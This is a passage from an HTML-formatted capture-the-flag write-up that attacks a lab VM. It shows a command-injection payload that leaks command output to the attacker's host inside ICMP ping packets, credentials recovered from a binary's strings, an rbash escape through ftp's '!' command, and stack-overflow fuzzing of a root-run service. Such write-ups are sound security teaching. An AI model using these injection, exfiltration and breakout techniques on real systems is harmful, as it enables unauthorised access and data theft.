</span><span class='line'>    0x0030:  3439 3828 6e67 696e 7829 2067 7569 643d  498<span class="o">(</span>nginx<span class="o">)</span>.guid<span class="o">=</span>
</span><span class='line'>    0x0040:  3439 3828 6e67 696e 7829 2067 7569 643d  498<span class="o">(</span>nginx<span class="o">)</span>.guid<span class="o">=</span>
</span><span class='line'>    0x0050:  3439 3828                                498<span class="o">(</span>
</span><span class='line'>09:18:14.439248 IP 192.168.56.102 &gt; 192.168.56.104: ICMP <span class="nb">echo </span>reply, id 6920, seq 1, length 64
</span><span class='line'>    0x0000:  4500 0054 a049 0000 4001 e840 c0a8 3866  E..T.I..@..@..8f
</span><span class='line'>    0x0010:  c0a8 3868 0000 535b 1b08 0001 56a3 1a54  ..8h..S<span class="o">[</span>....V..T
</span><span class='line'>    0x0020:  f357 0a00 6e67 696e 7829 2067 7569 643d  .W..nginx<span class="o">)</span>.guid<span class="o">=</span>
</span><span class='line'>    0x0030:  3439 3828 6e67 696e 7829 2067 7569 643d  498<span class="o">(</span>nginx<span class="o">)</span>.guid<span class="o">=</span>
</span><span class='line'>    0x0040:  3439 3828 6e67 696e 7829 2067 7569 643d  498<span class="o">(</span>nginx<span class="o">)</span>.guid<span class="o">=</span>
</span><span class='line'>    0x0050:  3439 3828                                498<span class="o">(</span>
</span><span class='line'>09:18:14.440365 IP 192.168.56.104 &gt; 192.168.56.102: ICMP <span class="nb">echo </span>request, id 7176, seq 1, length 64
</span><span class='line'>    0x0000:  4500 0054 0000 4000 4001 488a c0a8 3868  E..T..@.@.H...8h
</span><span class='line'>    0x0010:  c0a8 3866 0800 318a 1c08 0001 56a3 1a54  ..8f..1.....V..T
</span><span class='line'>    0x0020:  e35a 0a00 6769 6e78 2920 6772 6964 3d34  .Z..ginx<span class="o">)</span>.grid<span class="o">=</span>4
</span><span class='line'>    0x0030:  3938 286e 6769 6e78 2920 6772 6964 3d34  98<span class="o">(</span>nginx<span class="o">)</span>.grid<span class="o">=</span>4
</span><span class='line'>    0x0040:  3938 286e 6769 6e78 2920 6772 6964 3d34  98<span class="o">(</span>nginx<span class="o">)</span>.grid<span class="o">=</span>4
</span><span class='line'>    0x0050:  3938 286e                                98<span class="o">(</span>n
</span><span class='line'>09:18:14.440382 IP 192.168.56.102 &gt; 192.168.56.104: ICMP <span class="nb">echo </span>reply, id 7176, seq 1, length 64
</span><span class='line'>    0x0000:  4500 0054 a04a 0000 4001 e83f c0a8 3866  E..T.J..@..?..8f
</span><span class='line'>    0x0010:  c0a8 3868 0000 398a 1c08 0001 56a3 1a54  ..8h..9.....V..T
</span><span class='line'>    0x0020:  e35a 0a00 6769 6e78 2920 6772 6964 3d34  .Z..ginx<span class="o">)</span>.grid<span class="o">=</span>4
</span><span class='line'>    0x0030:  3938 286e 6769 6e78 2920 6772 6964 3d34  98<span class="o">(</span>nginx<span class="o">)</span>.grid<span class="o">=</span>4
</span><span class='line'>    0x0040:  3938 286e 6769 6e78 2920 6772 6964 3d34  98<span class="o">(</span>nginx<span class="o">)</span>.grid<span class="o">=</span>4
</span><span class='line'>    0x0050:  3938 286e                                98<span class="o">(</span>n
</span><span class='line'>09:18:14.441191 IP 192.168.56.104 &gt; 192.168.56.102: ICMP <span class="nb">echo </span>request, id 7432, seq 1, length 64
</span><span class='line'>    0x0000:  4500 0054 0000 4000 4001 488a c0a8 3868  E..T..@.@.H...8h
</span><span class='line'>    0x0010:  c0a8 3866 0800 ed92 1d08 0001 56a3 1a54  ..8f........V..T
</span><span class='line'>    0x0020:  f95d 0a00 286e 6769 6e78 290a 6f75 7073  .<span class="o">]</span>..<span class="o">(</span>nginx<span class="o">)</span>.oups
</span><span class='line'>    0x0030:  3d34 3938 286e 6769 6e78 290a 6f75 <span class="nv">7073</span>  <span class="o">=</span>498<span class="o">(</span>nginx<span class="o">)</span>.oups
</span><span class='line'>    0x0040:  3d34 3938 286e 6769 6e78 290a 6f75 <span class="nv">7073</span>  <span class="o">=</span>498<span class="o">(</span>nginx<span class="o">)</span>.oups
</span><span class='line'>    0x0050:  3d34 <span class="nv">3938</span>                                <span class="o">=</span>498
</span><span class='line'>09:18:14.441198 IP 192.168.56.102 &gt; 192.168.56.104: ICMP <span class="nb">echo </span>reply, id 7432, seq 1, length 64
</span><span class='line'>    0x0000:  4500 0054 a04b 0000 4001 e83e c0a8 3866  E..T.K..@..&gt;..8f
</span><span class='line'>    0x0010:  c0a8 3868 0000 f592 1d08 0001 56a3 1a54  ..8h........V..T
</span><span class='line'>    0x0020:  f95d 0a00 286e 6769 6e78 290a 6f75 7073  .<span class="o">]</span>..<span class="o">(</span>nginx<span class="o">)</span>.oups
</span><span class='line'>    0x0030:  3d34 3938 286e 6769 6e78 290a 6f75 <span class="nv">7073</span>  <span class="o">=</span>498<span class="o">(</span>nginx<span class="o">)</span>.oups
</span><span class='line'>    0x0040:  3d34 3938 286e 6769 6e78 290a 6f75 <span class="nv">7073</span>  <span class="o">=</span>498<span class="o">(</span>nginx<span class="o">)</span>.oups
</span><span class='line'>    0x0050:  3d34 <span class="nv">3938</span>                                <span class="o">=</span>498
</span></code></pre></td></tr></table></div></figure>


<p>Mind. Blown.</p>

<p>In case you don&rsquo;t see it, we have extracts of the <code>id</code> command in the request/response packets like <em>98(nginx).grid=4</em>. While this is not really fun to decipher, and with commands that produce a lot of output even worse, it was in fact <strong>something</strong> to work with!</p>

<p>I fiddled around with this for a little while longer, trying to make the output a little more readable. Eventually I fired up scapy and just printed the data section of the packet. Not much better, but with a little more effort I am sure you can get something very workable out of it.</p>

<figure class='code'><figcaption><span>Scapy sniff()</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="o">&gt;&gt;&gt;</span> <span class="n">sniff</span><span class="p">(</span><span class="nb">filter</span><span class="o">=</span><span class="s">&quot;icmp[icmptype] == 8 and host 192.168.56.104&quot;</span><span class="p">,</span> <span class="n">prn</span><span class="o">=</span><span class="k">lambda</span> <span class="n">x</span><span class="p">:</span> <span class="n">x</span><span class="o">.</span><span class="n">load</span><span class="p">)</span>
</span><span class='line'><span class="err">ؤ</span><span class="n">T</span><span class="err">�</span><span class="n">nginx</span><span class="p">)</span> <span class="n">guid</span><span class="o">=</span><span class="mi">498</span><span class="p">(</span><span class="n">nginx</span><span class="p">)</span> <span class="n">guid</span><span class="o">=</span><span class="mi">498</span><span class="p">(</span><span class="n">nginx</span><span class="p">)</span> <span class="n">guid</span><span class="o">=</span><span class="mi">498</span><span class="p">(</span>
</span><span class='line'><span class="err">ؤ</span><span class="n">T</span>
</span><span class='line'>   <span class="n">ginx</span><span class="p">)</span> <span class="n">grid</span><span class="o">=</span><span class="mi">498</span><span class="p">(</span><span class="n">nginx</span><span class="p">)</span> <span class="n">grid</span><span class="o">=</span><span class="mi">498</span><span class="p">(</span><span class="n">nginx</span><span class="p">)</span> <span class="n">grid</span><span class="o">=</span><span class="mi">498</span><span class="p">(</span><span class="n">n</span>
</span><span class='line'><span class="err">ؤ</span><span class="n">T</span><span class="err">�</span><span class="p">(</span><span class="n">nginx</span><span class="p">)</span>
</span><span class='line'><span class="n">oups</span><span class="o">=</span><span class="mi">498</span><span class="p">(</span><span class="n">nginx</span><span class="p">)</span>
</span><span class='line'><span class="n">oups</span><span class="o">=</span><span class="mi">498</span><span class="p">(</span><span class="n">nginx</span><span class="p">)</span>
</span><span class='line'><span class="n">oups</span><span class="o">=</span><span class="mi">498</span>
</span></code></pre></td></tr></table></div></figure>


<h2>sysadmin-tool</h2>

<p>So with actual output to work with, I can almost say I have shell, however, it&rsquo;s crap. Here I had many options to go for. Do I try and get one of those ping tunnels up to shell with? Or something else.</p>

<p>At one stage I ran <code>ls</code> as the command trying to see if there was anything in the web path that I may not have found yet. A file called <em>sysadmin-tool</em> was revealed. I browsed to the file which pushed it as a download for me, and saved it locally. I then ran the bin through <code>strings</code>:</p>

<figure class='code'><figcaption><span>sysadmin-tool strings</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# strings sysadmin-tool
</span><span class='line'>/lib/ld-linux.so.2
</span><span class='line'>__gmon_start__
</span><span class='line'>libc.so.6
</span><span class='line'>_IO_stdin_used
</span><span class='line'>chroot
</span><span class='line'>strncmp
</span><span class='line'>puts
</span><span class='line'>setreuid
</span><span class='line'>mkdir
</span><span class='line'>rmdir
</span><span class='line'>chdir
</span><span class='line'>system
</span><span class='line'>__libc_start_main
</span><span class='line'>GLIBC_2.0
</span><span class='line'>PTRh
</span><span class='line'><span class="o">[</span>^_<span class="o">]</span>
</span><span class='line'>Usage: sysadmin-tool --activate-service
</span><span class='line'>--activate-service
</span><span class='line'>breakout
</span><span class='line'>/bin/sed -i <span class="s1">&#39;s/^#//&#39;</span> /etc/sysconfig/iptables
</span><span class='line'>/sbin/iptables-restore &lt; /etc/sysconfig/iptables
</span><span class='line'>Service started...
</span><span class='line'>Use avida:dollars to access.
</span><span class='line'>/nginx/usr/share/nginx/html/breakout
</span></code></pre></td></tr></table></div></figure>


<p>From this alone we can deduce that when run, it may modify the firewall. It also looks like it contains some credentials, so I took note of those too. I then tried to run the command, followed by a nmap scan:</p>

<figure class='code'><figcaption><span>Ping pattern `id` command</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="p">;</span>./sysadmin-tool --activate-service<span class="p">|</span> xxd -p -c 16 <span class="p">|</span> <span class="k">while </span><span class="nb">read </span>line<span class="p">;</span> <span class="k">do </span>ping -p <span class="nv">$line</span> -c 1 -q 192.168.56.102<span class="p">;</span> <span class="k">done</span>
</span></code></pre></td></tr></table></div></figure>




<figure class='code'><figcaption><span>second nmap of Persistence</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# nmap 192.168.56.104 --reason -sV -p-
</span><span class='line'>
</span><span class='line'>Starting Nmap 6.46 <span class="o">(</span> http://nmap.org <span class="o">)</span> at 2014-09-18 09:46 SAST
</span><span class='line'>Nmap scan report <span class="k">for </span>192.168.56.104
</span><span class='line'>Host is up, received reset <span class="o">(</span>0.0017s latency<span class="o">)</span>.
</span><span class='line'>Not shown: 65533 filtered ports
</span><span class='line'>Reason: 65533 no-responses
</span><span class='line'>PORT   STATE SERVICE REASON  VERSION
</span><span class='line'>22/tcp open  ssh     syn-ack OpenSSH 5.3 <span class="o">(</span>protocol 2.0<span class="o">)</span>
</span><span class='line'>80/tcp open  http    syn-ack nginx 1.4.7
</span><span class='line'>
</span><span class='line'>Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
</span><span class='line'>Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned in 6637.05 seconds
</span></code></pre></td></tr></table></div></figure>


<p>Yay! SSH.</p>

<h2>shell and breakout as avida</h2>

<p>Using the information that looked like credentials retrieved in the previous section, I proceeded to SSH into the server:</p>

<figure class='code'><figcaption><span>avida rbash</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/Desktop/persistence# ssh avida@192.168.56.104
</span><span class='line'>The authenticity of host <span class="s1">&#39;192.168.56.104 (192.168.56.104)&#39;</span> can<span class="s1">&#39;t be established.</span>
</span><span class='line'><span class="s1">RSA key fingerprint is 37:22:da:ba:ef:05:1f:77:6a:30:6f:61:56:7b:47:54.</span>
</span><span class='line'><span class="s1">Are you sure you want to continue connecting (yes/no)? yes</span>
</span><span class='line'><span class="s1">Warning: Permanently added &#39;</span>192.168.56.104<span class="s1">&#39; (RSA) to the list of known hosts.</span>
</span><span class='line'><span class="s1">avida@192.168.56.104&#39;</span>s password:    <span class="c"># dollars</span>
</span><span class='line'>Last login: Thu Sep 18 05:57:30 2014
</span><span class='line'>-rbash-4.1<span class="err">$</span>
</span></code></pre></td></tr></table></div></figure>


<p>Op success. Or is it? I immediately noticed the prompt as <code>rbash</code>, aka restricted bash. :( Having a look around, I was in fact very limited to what I can do. Most annoyingly, I was unable to run commands with a <code>/</code> in them.</p>

<figure class='code'><figcaption><span>rbash restrictions</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>-rbash-4.1<span class="nv">$ </span>/bin/bash
</span><span class='line'>-rbash: /bin/bash: restricted: cannot specify <span class="sb">`</span>/<span class="err">&#39;</span> in <span class="nb">command </span>names
</span></code></pre></td></tr></table></div></figure>


<p>So the next logical step was to attempt &lsquo;breaking out&rsquo; of this shell so that I can have a better look around. I was able to cat say <code>/etc/passwd</code>, but that only gets you <em>that</em> far :P</p>

<p>After quite some time and some research, it became apparent that the well known breakouts from rbash are not possible.  I was unable to edit my PATH, change files and re-login or use the classic <code>vi</code> <code>:shell</code> breakout. Eventually (and out of desperation), I focussed my attention to <code>ftp</code>. Opening <code>ftp</code>, and typing <code>help</code> at the prompt, I studied each available command carefully. In the list was a exclamation mark(!), which I typed and pressed enter:</p>

<figure class='code'><figcaption><span>bash via ftp o_0</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>-rbash-4.1<span class="nv">$ </span>ftp
</span><span class='line'>ftp&gt; !
</span><span class='line'>+rbash-4.1<span class="nv">$ </span>/bin/bash
</span><span class='line'>bash-4.1<span class="err">$</span>
</span></code></pre></td></tr></table></div></figure>


<p>I got dropped into another <code>rbash</code> shell, however this time with a +. So, I went for <code>/bin/bash</code> and&hellip; w00t? I exported a new PATH to my environment, and all of those annoying rbash restrictions were gone. Thank goodness!</p>

<h2>the wopr game</h2>

<p>During the enumeration done while still stuck with <code>rbash</code>, I noticed that the machine was listening for connections on tcp/3333 locally when inspecting the output of <code>netstat</code>. Opening a telnet session to this port presented you with a &lsquo;game&rsquo;:</p>

<figure class='code'><figcaption><span>wopr</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bash-4.1<span class="nv">$ </span>telnet 127.0.0.1 3333
</span><span class='line'>Trying 127.0.0.1...
</span><span class='line'>Connected to 127.0.0.1.
</span><span class='line'>Escape character is <span class="s1">&#39;^]&#39;</span>.
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> hello, my name is sploitable
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> would you like to play a game?
</span><span class='line'>&gt; yes!
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> yeah, I don<span class="err">&#39;</span>t think so
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> bye!
</span><span class='line'>Connection closed by foreign host.
</span><span class='line'>bash-4.1<span class="err">$</span>
</span></code></pre></td></tr></table></div></figure>


<p>I asked really, really nicely, but no matter how polite I was, it would just not let me play!</p>

<p>Further inspection showed that the game was possibly run as root from <code>/usr/local/bin/wopr</code></p>

<figure class='code'><figcaption><span>wopr as root</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bash-4.1<span class="nv">$ </span>ps -ef <span class="p">|</span> grep wopr
</span><span class='line'>root      1005     1  0 05:42 ?        00:00:00 /usr/local/bin/wopr
</span><span class='line'>root      1577  1005  0 06:43 ?        00:00:00 <span class="o">[</span>wopr<span class="o">]</span> &lt;defunct&gt;
</span><span class='line'>avida     1609  1501  0 06:47 pts/0    00:00:00 grep wopr
</span><span class='line'>
</span><span class='line'>bash-4.1<span class="nv">$ </span>ls -lah /usr/local/bin/wopr
</span><span class='line'>-rwxr-xr-x. 1 root root 7.7K Apr 28 07:43 /usr/local/bin/wopr
</span></code></pre></td></tr></table></div></figure>


<p><code>wopr</code> was also readable to me which was great news! I decided to get a copy of the binary onto my local Kali Linux box, and take a closer look at the internals:</p>

<figure class='code'><figcaption><span>wopr xxd xfer</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="c"># first, hex encode the file</span>
</span><span class='line'>bash-4.1<span class="nv">$ </span>xxd -p -c 36 /usr/local/bin/wopr
</span><span class='line'>7f454c460101010000000000000000000200030001000000c08604083400000080110000
</span><span class='line'>0000000034002000090028001e001b000600000034000000348004083480040820010000
</span><span class='line'><span class="o">[</span>... snip ...<span class="o">]</span>
</span><span class='line'>38362e6765745f70635f7468756e6b2e6278006d61696e005f696e697400
</span><span class='line'>bash-4.1<span class="err">$</span>
</span><span class='line'>
</span><span class='line'><span class="c"># next, I copied the xxd output from the persistence terminal</span>
</span><span class='line'><span class="c"># and pasted it into a file called wopr.xxd. Then reverted it</span>
</span><span class='line'><span class="c"># and redirected the output to `wopr`</span>
</span><span class='line'>root@kali:~# cat wopr.xxd <span class="p">|</span> xxd -r -p &gt; wopr
</span></code></pre></td></tr></table></div></figure>


<p>The idea was to see if there may be a way to exploit this program so that I can execute some commands using it. It is running as root after all&hellip;</p>

<h2>wopr, stack smashing</h2>

<p>Poking around the binary, I mostly used <code>gdb</code> along with <a href="https://github.com/longld/peda">peda</a>.
Checksec revealed that this binary was compiled with quite a few security features built in.</p>

<figure class='code'><figcaption><span>wopr binary sec</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# gdb -q ./wopr
</span><span class='line'>Reading symbols from persistence/wopr...<span class="o">(</span>no debugging symbols found<span class="o">)</span>...done.
</span><span class='line'>gdb-peda<span class="nv">$ </span>checksec
</span><span class='line'>CANARY    : ENABLED
</span><span class='line'>FORTIFY   : disabled
</span><span class='line'>NX        : ENABLED
</span><span class='line'>PIE       : disabled
</span><span class='line'>RELRO     : Partial
</span></code></pre></td></tr></table></div></figure>


<p>Digesting the above output should bring us to a few conclusions. A stack canary is present, meaning if we corrupt memory, and dont have a correct canary, the binary may terminate itself as a protection mechanism once it detects the incorrect canary. Secondly, the binary is compiled to mark the stack as non executable. Any potential shellcode that we write here will not be executed. Lastly, the GOT relocation is set to read only, meaning function locations are resolved at the beginning of execution and the GOT is then marked as read only resulting in the inability to rewrite plt type lookups.</p>

<p>With all of that in mind, I ran the binary with the <code>r</code> command, and made a new telnet session to it.</p>

<figure class='code'><figcaption><span>wopr run</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>gdb-peda<span class="nv">$ </span>r
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> <span class="nb">bind complete</span>
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> waiting <span class="k">for </span>connections
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> logging queries to <span class="nv">$TMPLOG</span>
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> got a connection
</span><span class='line'><span class="o">[</span>New process 26936<span class="o">]</span>
</span><span class='line'><span class="o">[</span>Inferior 2 <span class="o">(</span>process 26936<span class="o">)</span> exited normally<span class="o">]</span>
</span><span class='line'>Warning: not running or target is remote
</span><span class='line'>gdb-peda<span class="err">$</span>
</span></code></pre></td></tr></table></div></figure>


<p>When the new connection came in, a notice of a new process appears. Disassembling the main function gives us an indication that the process is doing a <code>fork()</code></p>

<figure class='code'><figcaption><span>wopr fork()</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>gdb-peda<span class="nv">$ </span>disass main
</span><span class='line'>Dump of assembler code <span class="k">for function </span>main:
</span><span class='line'>    <span class="o">[</span>.. snip ..<span class="o">]</span>
</span><span class='line'>   0x080489fd &lt;+543&gt;:   mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,0x8048cb2
</span><span class='line'>   0x08048a04 &lt;+550&gt;:   call   0x804866c &lt;puts@plt&gt;
</span><span class='line'>   0x08048a09 &lt;+555&gt;:   call   0x804867c &lt;fork@plt&gt; <span class="c"># &lt;--</span>
</span><span class='line'>   0x08048a0e &lt;+560&gt;:   <span class="nb">test   </span>eax,eax
</span><span class='line'>   0x08048a10 &lt;+562&gt;:   jne    0x8048b0e &lt;main+816&gt;
</span><span class='line'>   0x08048a16 &lt;+568&gt;:   mov    DWORD PTR <span class="o">[</span>esp+0x8<span class="o">]</span>,0x21
</span><span class='line'>   0x08048a1e &lt;+576&gt;:   mov    DWORD PTR <span class="o">[</span>esp+0x4<span class="o">]</span>,0x8048cc8
</span><span class='line'>   0x08048a26 &lt;+584&gt;:   mov    eax,DWORD PTR <span class="o">[</span>ebp-0x22c<span class="o">]</span>
</span><span class='line'>   0x08048a2c &lt;+590&gt;:   mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,eax
</span><span class='line'>   0x08048a2f &lt;+593&gt;:   call   0x804858c &lt;write@plt&gt;
</span><span class='line'>    <span class="o">[</span>.. snip ..<span class="o">]</span>
</span><span class='line'>End of assembler dump.
</span><span class='line'>gdb-peda<span class="nv">$ </span>
</span></code></pre></td></tr></table></div></figure>


<p>Why is the <code>fork()</code> so important!? We will see in a bit just hang on. :)</p>

<p>So back to fuzzing wopr, I proceeded to send some arbtritary input via the telnet session. I noticed once I had sent more than 30 characters as input, wopr would freak out! This is a good freak out btw :D</p>

<p>Sending 30 x A&rsquo;s results in:</p>

<figure class='code'><figcaption><span>wopr stopper</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>gdb-peda<span class="nv">$ </span><span class="o">[</span>+<span class="o">]</span> got a connection
</span><span class='line'>*** stack smashing detected ***: wopr <span class="nv">terminated</span>
</span><span class='line'><span class="o">=======</span> Backtrace: <span class="o">=========</span>
</span><span class='line'>/lib/i386-linux-gnu/libc.so.6<span class="o">(</span>__fortify_fail+0x40<span class="o">)[</span>0xb7f5ebb0<span class="o">]</span>
</span><span class='line'>/lib/i386-linux-gnu/libc.so.6<span class="o">(</span>+0xeab6a<span class="o">)[</span>0xb7f5eb6a<span class="o">]</span>
</span><span class='line'>wopr<span class="o">[</span>0x80487dc<span class="o">]</span>
</span><span class='line'>wopr<span class="o">[</span>0x8048ad6<span class="o">]</span>
</span><span class='line'>/lib/i386-linux-gnu/libc.so.6<span class="o">(</span>__libc_start_main+0xe6<span class="o">)[</span>0xb7e8ae36<span class="o">]</span>
</span><span class='line'>wopr<span class="o">[</span>0x80486e1<span class="o">]</span>
</span><span class='line'><span class="o">=======</span> Memory map: <span class="o">========</span>
</span><span class='line'>08048000-08049000 r-xp 00000000 08:01 1184792    wopr
</span><span class='line'>08049000-0804a000 r--p 00000000 08:01 1184792    wopr
</span><span class='line'>0804a000-0804b000 rw-p 00001000 08:01 1184792    wopr
</span><span class='line'>0804b000-0806c000 rw-p 00000000 00:00 0          <span class="o">[</span>heap<span class="o">]</span>
</span><span class='line'>b7e3b000-b7e57000 r-xp 00000000 08:01 1573598    /lib/i386-linux-gnu/libgcc_s.so.1
</span><span class='line'>b7e57000-b7e58000 rw-p 0001b000 08:01 1573598    /lib/i386-linux-gnu/libgcc_s.so.1
</span><span class='line'>b7e73000-b7e74000 rw-p 00000000 00:00 0
</span><span class='line'>b7e74000-b7fbd000 r-xp 00000000 08:01 1580474    /lib/i386-linux-gnu/libc-2.13.so
</span><span class='line'>b7fbd000-b7fbe000 ---p 00149000 08:01 1580474    /lib/i386-linux-gnu/libc-2.13.so
</span><span class='line'>b7fbe000-b7fc0000 r--p 00149000 08:01 1580474    /lib/i386-linux-gnu/libc-2.13.so
</span><span class='line'>b7fc0000-b7fc1000 rw-p 0014b000 08:01 1580474    /lib/i386-linux-gnu/libc-2.13.so
</span><span class='line'>b7fc1000-b7fc4000 rw-p 00000000 00:00 0
</span><span class='line'>b7fde000-b7fe1000 rw-p 00000000 00:00 0
</span><span class='line'>b7fe1000-b7fe2000 r-xp 00000000 00:00 0          <span class="o">[</span>vdso<span class="o">]</span>
</span><span class='line'>b7fe2000-b7ffe000 r-xp 00000000 08:01 1579852    /lib/i386-linux-gnu/ld-2.13.so
</span><span class='line'>b7ffe000-b7fff000 r--p 0001b000 08:01 1579852    /lib/i386-linux-gnu/ld-2.13.so
</span><span class='line'>b7fff000-b8000000 rw-p 0001c000 08:01 1579852    /lib/i386-linux-gnu/ld-2.13.so
</span><span class='line'>bffdf000-c0000000 rw-p 00000000 00:00 0          <span class="o">[</span>stack<span class="o">]</span>
</span></code></pre></td></tr></table></div></figure>


<p>So it looks like we may have a <a href="http://en.wikipedia.org/wiki/Stack_buffer_overflow">buffer overflow</a> here. What is important though is the backtrace shows that the last fail was in <code>__fortify_fail</code>. <code>__fortify_fail</code> is normally just a error reporter, as was called because the stack cookie check failed. Remember the CANARY we detected earlier with the <code>checksec</code> output? With that knowledge, is almost safe to assume that byte 30 is where the stack canary starts. This means that if we want to corrupt more memory further up the stack (which is what we want actually), we need to find a way to know what the canary value is.</p>

<p>But lets not stop there. I continued to place more A&rsquo;s into the input until at byte 39 I noticed 41 (hex for A) in the backtrace. By the time I had 42 A&rsquo;s, the backtrace had a full 4 bytes of 41.</p>

<figure class='code'><figcaption><span>possible EIP</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
